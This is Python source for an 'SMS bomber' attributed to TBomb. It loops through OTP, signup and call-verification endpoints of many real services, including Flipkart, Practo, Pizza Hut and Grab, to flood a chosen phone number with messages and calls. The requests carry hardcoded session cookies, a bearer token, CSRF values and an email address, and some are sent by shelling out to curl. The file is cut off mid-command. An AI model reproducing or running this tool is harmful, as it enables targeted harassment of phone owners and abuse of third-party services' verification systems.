#!/usr/bin/env python
from datetime import datetime
import os
import hashlib
import sys
import time
import threading
import string
import random
import shutil
import urllib.request
import urllib.parse

try:
    import requests
except ImportError:
    print('[!] Error: some dependencies are not installed')
    print('Type \'pip install -r requirements.txt\' to install all required packages')
    exit()

colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W='\033[0m'
# The Credit For This Code Goes To SpeedX And All Other Contributors Listed At https://github.com/TheSpeedX/TBomb
# If You Wanna Take Credits For This Code, Please Look Yourself Again

country_codes = {
    '93': 'AF',
    '355': 'AL',
    '213': 'DZ',
    '376': 'AD',
    '244': 'AO',
    '672': 'AQ',
    '54': 'AR',
    '374': 'AM',
    '297': 'AW',
    '61': 'AU',
    '43': 'AT',
    '994': 'AZ',
    '973': 'BH',
    '880': 'BD',
    '375': 'BY',
    '32': 'BE',
    '501': 'BZ',
    '229': 'BJ',
    '975': 'BT',
    '591': 'BO',
    '387': 'BA',
    '267': 'BW',
    '55': 'BR',
    '246': 'IO',
    '673': 'BN',
    '359': 'BG',
    '226': 'BF',
    '257': 'BI',
    '855': 'KH',
    '237': 'CM',
    '238': 'CV',
    '236': 'CF',
    '235': 'TD',
    '56': 'CL',
    '86': 'CN',
    '57': 'CO',
    '269': 'KM',
    '682': 'CK',
    '506': 'CR',
    '385': 'HR',
    '53': 'CU',
    '599': 'AN',
    '357': 'CY',
    '420': 'CZ',
    '243': 'CD',
    '45': 'DK',
    '253': 'DJ',
    '670': 'TL',
    '593': 'EC',
    '20': 'EG',
    '503': 'SV',
    '240': 'GQ',
    '291': 'ER',
    '372': 'EE',
    '251': 'ET',
    '500': 'FK',
    '298': 'FO',
    '679': 'FJ',
    '358': 'FI',
    '33': 'FR',
    '689': 'PF',
    '241': 'GA',
    '220': 'GM',
    '995': 'GE',
    '49': 'DE',
    '233': 'GH',
    '350': 'GI',
    '30': 'GR',
    '299': 'GL',
    '502': 'GT',
    '224': 'GN',
    '245': 'GW',
    '592': 'GY',
    '509': 'HT',
    '504': 'HN',
    '852': 'HK',
    '36': 'HU',
    '354': 'IS',
    '91': 'IN',
    '62': 'ID',
    '98': 'IR',
    '964': 'IQ',
    '353': 'IE',
    '972': 'IL',
    '39': 'IT',
    '225': 'CI',
    '81': 'JP',
    '962': 'JO',
    '254': 'KE',
    '686': 'KI',
    '383': 'XK',
    '965': 'KW',
    '996': 'KG',
    '856': 'LA',
    '371': 'LV',
    '961': 'LB',
    '266': 'LS',
    '231': 'LR',
    '218': 'LY',
    '423': 'LI',
    '370': 'LT',
    '352': 'LU',
    '853': 'MO',
    '389': 'MK',
    '261': 'MG',
    '265': 'MW',
    '60': 'MY',
    '960': 'MV',
    '223': 'ML',
    '356': 'MT',
    '692': 'MH',
    '222': 'MR',
    '230': 'MU',
    '262': 'RE',
    '52': 'MX',
    '691': 'FM',
    '373': 'MD',
    '377': 'MC',
    '976': 'MN',
    '382': 'ME',
    '212': 'EH',
    '258': 'MZ',
    '95': 'MM',
    '264': 'NA',
    '674': 'NR',
    '977': 'NP',
    '31': 'NL',
    '687': 'NC',
    '64': 'NZ',
    '505': 'NI',
    '227': 'NE',
    '234': 'NG',
    '683': 'NU',
    '850': 'KP',
    '47': 'SJ',
    '968': 'OM',
    '92': 'PK',
    '680': 'PW',
    '970': 'PS',
    '507': 'PA',
    '675': 'PG',
    '595': 'PY',
    '51': 'PE',
    '63': 'PH',
    '48': 'PL',
    '351': 'PT',
    '974': 'QA',
    '242': 'CG',
    '40': 'RO',
    '7': 'RU',
    '250': 'RW',
    '590': 'MF',
    '290': 'SH',
    '508': 'PM',
    '685': 'WS',
    '378': 'SM',
    '239': 'ST',
    '966': 'SA',
    '221': 'SN',
    '381': 'RS',
    '248': 'SC',
    '232': 'SL',
    '65': 'SG',
    '421': 'SK',
    '386': 'SI',
    '677': 'SB',
    '252': 'SO',
    '27': 'ZA',
    '82': 'KR',
    '211': 'SS',
    '34': 'ES',
    '94': 'LK',
    '249': 'SD',
    '597': 'SR',
    '268': 'SZ',
    '46': 'SE',
    '41': 'CH',
    '963': 'SY',
    '886': 'TW',
    '992': 'TJ',
    '255': 'TZ',
    '66': 'TH',
    '228': 'TG',
    '690': 'TK',
    '676': 'TO',
    '216': 'TN',
    '90': 'TR',
    '993': 'TM',
    '688': 'TV',
    '256': 'UG',
    '380': 'UA',
    '971': 'AE',
    '44': 'GB',
    '1': 'US',
    '598': 'UY',
    '998': 'UZ',
    '678': 'VU',
    '379': 'VA',
    '58': 'VE',
    '84': 'VN',
    '681': 'WF',
    '967': 'YE',
    '260': 'ZM',
    '263': 'ZW'
}


def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def banner():

    clr()
    logo="""
   ████████ █████                 ██
   ▒▒▒██▒▒▒ ██▒▒██                ██
      ██    ██  ██        ██   ██ ██
      ██    █████▒  ████  ███ ███ █████
      ██    ██▒▒██ ██  ██ ██▒█▒██ ██▒▒██
      ██    ██  ██ ██  ██ ██ ▒ ██ ██  ██
      ██    █████▒ ▒████▒ ██   ██ █████▒
      ▒▒    ▒▒▒▒▒   ▒▒▒▒  ▒▒   ▒▒ ▒▒▒▒▒
                                         """
    print(random.choice(colors)+logo+W)
    print("\n")



count_inf = 0


def infinite(pn, dl, ch, max):
    global count_inf
    while True:
        while os.path.exists('proc.xxx'):
            time.sleep(0.5)
        os.system('touch proc.xxx')
        api = random.choice(ch)
        try:
            ret = getapi(pn, api, 91)
        except Exception:
            ret = False
        if not ret:
            while ch.count(api) > 0:
                ch.remove(api)
            continue
        os.system('rm proc.xxx >/dev/null 2>&1')
        count_inf += 1
        # os.system('echo SpeedX >> count.xxx')
        time.sleep(float(dl))
        if (count_inf > maxlim):
            exit()


def checkinternet():
    res = False
    try:
        # requests.get('https://www.google.com', verify=True)
        requests.get('https://www.google.com')
        res = False
    except Exception:
        res = True
    if res:
        print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies...")
        print('\t\tTBomb Will Stop Now...\n\n')
        banner()
        exit()

def getapi(pn,lim,cc):
    cc=str(cc)
    pn=str(pn)
    lim = int(lim)
    url = ["https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" +
           str(cc) + "&nod=4&phone=" + pn, "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn, "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn]
    try:
        if lim < len(url):
            urllib.request.urlopen(str(url[lim]))
            return True
    except (urllib.error.HTTPError, urllib.error.URLError):
        return False
    if lim == 3:
        headers = {
            'Host': 'pharmeasy.in',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://pharmeasy.in/',
            'Content-Type': 'application/json',
            'Content-Length': '30',
            'Connection': 'keep-alive',
        }

        data = {"contactNumber":pn}

        response = requests.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data)
        return response.status_code==200
    elif lim == 4:
        cookies = {
        '_ga': 'GA1.2.1273460610.1561191565',
        '_gid': 'GA1.2.172574299.1561191565',
        '_gcl_au': '1.1.833556660.1561191566',
        '_fbp': 'fb.1.1561191568709.1707722126',
        'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
        }
        headers={
            'Host': 'www.heromotocorp.com',
            'Connection': 'keep-alive',
            'Content-Length': '126',
            'Accept': '*/*',
            'Origin': 'https://www.heromotocorp.com',
            'X-Requested-With': 'XMLHttpRequest',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }

        data = {
          'mobile_no': pn,
          'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
          'mobile_no_otp': '',
          'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
        }

        response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)

        return response.status_code==200
    elif lim == 5:
        cookies = {
            'Cookie:_ga': 'GA1.2.1483885314.1559157646',
            '_fbp': 'fb.1.1559157647161.1989205138',
            'TiPMix': '91.9909185226964',
            'gcb_t_track': 'SEO - Google',
            'gcb_t_keyword': '',
            'gcb_t_l_url': 'https://www.google.com/',
            'gcb_utm_medium': '',
            'gcb_utm_campaign': '',
            'ASP.NET_SessionId': 'ioqkek5lbgvldlq4i3cmijcs',
            'web_app_landing_utm_source': '',
            'web_app_landing_url': '/personal-loan',
            'webapp_landing_referral_url': 'https://www.google.com/',
            'ARRAffinity': '747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417',
            '_gid': 'GA1.2.969623705.1560660444',
            '_gat': '1',
            'current_url': 'https://indialends.com/personal-loan',
            'cookies_plbt': '0',
        }

        headers = {
            'Host': 'indialends.com',
            'Connection': 'keep-alive',
            'Content-Length': '75',
            'Accept': '*/*',
            'Origin': 'https://indialends.com',
            'X-Requested-With': 'XMLHttpRequest',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'https://indialends.com/personal-loan',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        }

        data = {
          'aeyder03teaeare': '1',
          'ertysvfj74sje': cc,
          'jfsdfu14hkgertd': pn,
          'lj80gertdfg': '0'
        }

        response = requests.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data)
        return True
    elif lim == 6:
        headers = {
        'host': 'www.flipkart.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'accept-encoding': 'gzip, deflate, br',
        'referer': 'https://www.flipkart.com/',
        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop',
        'origin': 'https://www.flipkart.com',
        'connection': 'keep-alive',
        'Content-Type': 'application/json; charset=utf-8'}

        data = {"loginId":["+"+cc+pn],"supportAllStates":true}

        response = requests.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data)
        return True
    elif lim == 7:
        cookies = {
        'Cookie:T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050',
        'SWAB': 'build-44be9e47461a74d737914207bcbafc30',
        'lux_uid': '155867904381892986',
        'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
        'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI',
        's_cc': 'true',
        'SN': '2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078',
        'gpv_pn': 'HomePage',
        'gpv_pn_t': 'Homepage',
        'S': 'd1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==',
        's_sq': '%5B%5BB%5D%5D'}

        headers = {
            'Host': 'www.flipkart.com',
            'Connection': 'keep-alive',
            'Content-Length': '60',
            'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop',
            'Origin': 'https://www.flipkart.com',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Referer': 'https://www.flipkart.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        }

        data = {
          'loginId': '+'+cc+pn,
          'state': 'VERIFIED',
          'churnEmailRequest': 'false'
        }

        response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
        return True
    elif lim == 8:
        headers = {
            'Host': 'www.ref-r.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Length': '26',
            'DNT': '1',
            'Connection': 'keep-alive',
        }

        data = {
          'mobile': pn,
          'submit': '1',
          'undefined': ''
        }

        response = requests.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data)
        return True
    elif lim == 9:

        headers = {
            'X-DROID-VERSION': '4.12.5',
            'API-Version': '2.0',
            'user-agent': 'samsung SM-G9350 0 4.4.2',
            'client-version': 'Android-4.12.5',
            'X-DROID-VERSION-CODE': '158',
            'Accept': 'application/json',
            'client-name': 'Practo Android App',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'accounts.practo.com',
            'Connection': 'Keep-Alive',
            'Content-Length': '96'}

        data = {
          'client_name': 'Practo Android App',
          'mobile': '+'+cc+pn,
          'fingerprint': '',
          'device_name':'samsung+SM-G9350'}
        response = requests.post( "https://accounts.practo.com/send_otp", headers=headers, data=data)
        rd=response.text
        # rd = os.popen('curl -s -X POST -H "X-DROID-VERSION:4.12.5" -H "API-Version:2.0" -H "user-agent:samsung SM-G9350 0 4.4.2" -H "client-version:Android-4.12.5" -H "X-DROID-VERSION-CODE:158" -H "Accept:application/json" -H "client-name:Practo Android App" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:accounts.practo.com" -H "Connection:Keep-Alive" -H "Content-Length:96" -d  "client_name=Practo+Android+App&fingerprint=&mobile=%2B' + cc + pn + '&device_name=samsung+SM-G9350&"  "https://accounts.practo.com/send_otp"').read()
        return rd.find("success") != -1
    elif lim == 10:

        headers = {
            'Host': 'm.pizzahut.co.in',
            'content-length': '114',
            'origin': 'https://m.pizzahut.co.in',
            'authorization': 'Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5pTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4',
            'x-source-origin': 'PWAFW',
            'content-type': 'application/json',
            'accept': 'application/json, text/plain, */*',
            'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
            'save-data': 'on',
            'languagecode': 'en',
            'referer': 'https://m.pizzahut.co.in/login',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            'cookie': 'AKA_A2=A'}
        data = {"customer":{"MobileNo":pn,"UserName":pn,"merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}

        response = requests.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, data=data)
        return True
    elif lim == 11:
        headers = {
            'host': 'www.goibibo.com',
            'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.5',
            'accept-encoding': 'gzip, deflate, br',
            'referer': 'https://www.goibibo.com/mobile/?sms=success',
            'content-type': 'application/x-www-form-urlencoded',
            'content-length': '14',
            'connection': 'keep-alive',
            'upgrade-insecure-requests': '1'}

        data = {'mbl': pn}

        response = requests.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data)
        return True
    elif lim == 12:
        headers = {
        'Host': 'www.apollopharmacy.in',
        'content-length': '17',
        'accept': '*/*',
        'origin': 'https://www.apollopharmacy.in',
        'x-requested-with': 'XMLHttpRequest',
        'save-data': 'on',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'referer': 'https://www.apollopharmacy.in/sociallogin/mobile/login/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        'cookie': 'section_data_ids=%7B%22cart%22%3A1560239751%7D'}

        data = {'mobile': pn}

        response = requests.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data=data)
        rd=response.text
        return rd.find("sent") != -1
    elif lim == 13:
        cookies = {
            'Cookie:_ga': 'GA1.2.979928319.1560364071',
            '_gid': 'GA1.2.666270216.1560364071',
            'V': '201',
            '_fbp': 'fb.1.1560364076913.1528349725',
            'cto_lwid': 'd91bea3a-7610-45aa-8f78-65a0d740fb46',
            'PushSubscriberStatus': 'DENIED',
            'peclosed': 'true',
            'G_ENABLED_IDPS': 'google',
            'TS018cc593': '01ef61aed0fca110f50d8e3be2c66eb83188f6df8495c0ed2cd772829370fc12690954aad0834f545b57764467dbb66efb05d481a8958aebb273751956ef9eb383a3ba22dd1c94d82021e9d4c40011d4ab9bd97c6f0a74628ac12e8f7bcb663c1608e7288ebd252051cb84def3b021d3bcf643d3f3728ca9c0d9c780d171578ba966774f11ac44864a7f3da59791cb55f2741f23d72f7843efe9306459c00ec2e5f00065729a8573baba42384bb7cf46eb55cf89f72f1dcd5619a26e4ff32c63d06cac8c4bb158da6640bc0b11193134cbf38050ae0db230aa258b1181749fb0373afe041ad1aeffd0c08be7a62010db02cc65edfb1341d2de54cdf475c5dcd84e16c64c50',
            '_gac_UA-68002030-1': '1.1560366197.Cj0KCQjwxYLoBRCxARIsAEf16-tx5UXrrP9SEhR8dPkTL4a9woEF7Ae-kvSlzKdgq35y31DeK3_uhg8aAkRBEALw_wcB',
            'cdigiMrkt': 'utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AFri%2C%2012%20Jul%202019%2019%3A03%3A17%20GMT%7C',
            'ImpressionCookie': '4',
            'ip': '10.1.10.1',
            'sessionStatus': 'true|undefined',
            'FirstPage': 'Thu Jun 13 2019 00:33:53 GMT+0530 (India Standard Time)',
            '_dc_gtm_UA-68002030-1': '1',
            'uI': 'johnyaho%40gmail.com',
            'TS01fe4249': '01ef61aed09c32c6a53ce9e431a6a719c416867f2f3ad713fde2e74175bc248acc7a523f41e9751d032859a159bfff87664b90c3d0a9dfb2392f75876ccbe273b8a8e81d7a8d25047453c17a2905eca7eff26b780c'}

        headers = {
            'Host': 'www.ajio.com',
            'Connection': 'keep-alive',
            'Content-Length': '144',
            'Accept': 'application/json',
            'Origin': 'https://www.ajio.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
            'content-type': 'application/json',
            'Referer': 'https://www.ajio.com/signup',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}

        data = {"firstName":"SpeedX","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"0000","requestType":"SENDOTP"}

        response = requests.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, cookies=cookies, json=data)
        rd=response.text
        if rd.find("\"statusCode\":\"1\"") != -1:
            return True
        else:
            return False
    elif lim == 14:

        headers = {
            'Host': 'api.cloud.altbalaji.com',
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://lite.altbalaji.com',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36',
            'Content-Type': 'application/json;charset=UTF-8',
            'Referer': 'https://lite.altbalaji.com/subscribe?progress=input',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        }


        data = {"country_code":cc,"phone_number":pn}

        response = requests.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data)
        rd=response.text
        return rd == '24f467b24087ff48c96321786d89c69f'
    elif lim == 15:

        cookies = {
            'Cookie:frontend': 'a27mn3h3irt1rlt6i55s93p9r5',
            'frontend_cid': '8zqBBzwQTMIt9UKg',
            '_BEAMER_USER_ID_gADrycBn12870': 'c9fe4f7d-b421-4bad-9cf2-0a4db716dff4',
            'G_ENABLED_IDPS': 'google',
        }

        headers = {
            'Host': 'www.aala.com',
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Origin': 'https://www.aala.com',
            'X-Requested-With': 'XMLHttpRequest',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'https://www.aala.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5',
        }

        data = {
          'email': cc+pn,
          'firstname': 'SpeedX',
          'lastname': 'SpeedX'
        }

        response = requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data)
        rd=response.text
        return rd.find('code:') != -1
    elif lim == 16:

        data = {
          'method': 'SMS',
          'countryCode': 'id',
          'phoneNumber': cc+pn,
          'templateID': 'pax_android_production'
        }

        response = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=data)
        return True
    elif lim == 100:
        rd = os.popen('curl -s -X GET "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/' +
                      pn + '?callType=otpOnCall"').read()
        return rd.lower().find("new otp has been") != -1
    elif lim == 101:
        rd = os.popen('curl -s -X POST -d mobile=%2B' + cc + '-' + pn +
                      ' https://marketing.tllms.com/elearn/api/v4/authentications/phone_call').read()
        return rd.lower().find("otp requests exceeded") == -1
    elif lim == 102:
        rd = os.popen('curl -s -X POST -H "Host:www.realestateindia.com" -H "content-length:58" -H "accept:text/html, */*; q=0.01" -H "origin:https://www.realestateindia.com" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.realestateindia.com/thanks.php?newreg" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_gat=1" -H "cookie:rei_mem_mobile_verify_status=0" -H "cookie:rei_mem_email_verify_status=N" -H "cookie:rei_mem_block_status=0" -H "cookie:rei_member_country=IN" -H "cookie:rei_paid_status=0" -H "cookie:rei_member_type=1" -H "cookie:rei_member_email=Fakemam%40ril.com" -H "cookie:rei_member_name=Fakeman" -H "cookie:rei_member_id=1547045" -H "cookie:cooki_sess_id=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:name=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:_gid=GA1.2.626525909.1560836369" -H "cookie:_ga=GA1.2.1033079331.1560836369" -H "cookie:visitedToken=176961560836367" -d \'action_id=call_to_otp&mob_num=' + pn + '&member_id=1547045\' "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php?sid=0.5983221395805354"').read()
        return rd.lower().find("y") != -1
    elif lim == 103:
        os.system(
            'curl -s -X POST -H "Host:www.olx.in" -H "content-length:44" -H "accept:*/*" -H "x-newrelic-id:VQMGU1ZVDxABU1lbBgMDUlI=" -H "origin:https://www.olx.in" -H "user-agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "referer:https://www.olx.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:onap=16b1b8f48d4x746d47ab-1-16b1b8f48d4x746d47ab-19-1559537345" -H "cookie:bm_sv=CDB97F50DA6615AC420F3E6E77B04E42~OoX2fAuP7ggcNa0VjzE95FzJNKRdJlW09Hja0/cysIGF1sJoBO7i0ndGXqnTWLaunlyxktHLbE8BSstPCRYn8VdP15lvUxK3ZY9ahXOSgwAidxwXd1jCe5wjIzYbiXp5eKNWfFpowhFbpxloe+SrbiE0YHJVPcCV5bmdsHgPfQc=" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:hint=true" -H "cookie:_gid=GA1.2.369819276.1559535517" -H "cookie:_ga=GA1.2.665688753.1559535517" -H "cookie:ldTd=true" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:HIDE_ONBOARDING_LOCATION=true" -H "cookie:testCookie=testCookie" -H "cookie:ak_bmsc=307C5311FB00A3F4E856AFFE1A9D000B0214BED9E0210000909FF45C1E802067~plFZfbMQGgEDr7OWVe9FvqfT24ZtOVMamtYcaip71IYOrv2+SQ6fokSvMk2Uesz5v1sFfaichbtDgeVSj3te3vXJKezSWgvoVWrK7gfzFrLz1ruBm0MQj01V5CmpaTr6tRgDRSN6bks3nqvOHzR0tA1IoqfDfq2MKtmDjbknCI5FlLYUTwqlnwHowYArfybn2n3yilE6VKHjW+tH8kqjAfH8BGuijpmO9pNkgmIyOeaZIVM3k6FGOL3Wj3jLI8uGaU" -H "cookie:_abck=153BD3D333948A58932748CAC3D4C3F40214BED9E0210000909FF45C18838E05~0~8O+udxdG38sBFTPZpaBL4IGj7eUcKJ1VwAtJ52GMO5E=~-1~-1" -H "cookie:bm_sz=BD665D919F7C6FA8374F196445596436~YAAQ2b4UArpOAwtrAQAAq0qPGwNksHBgphLwDzwfBlwIRQJAG7txmjBo/of7NiAJ93gy/7vBhQ9l5sIKdwtl2j+U4bys2Hhh5tZlZL/jqdnW/JrgmgawcxiunAJ32BbY9UtnFIrNxbbRvzQCYnSwf/cz9a7jURsui7leuLaVm7mQEcHPOtC6g5jrToAMTbdA" -H "cookie:97c09e2aabdfed89b87a3010d7f13c64=353b4f9fd82d26268ad11b2c1e9ae019" -H "cookie:lqstatus=1559536704" -H 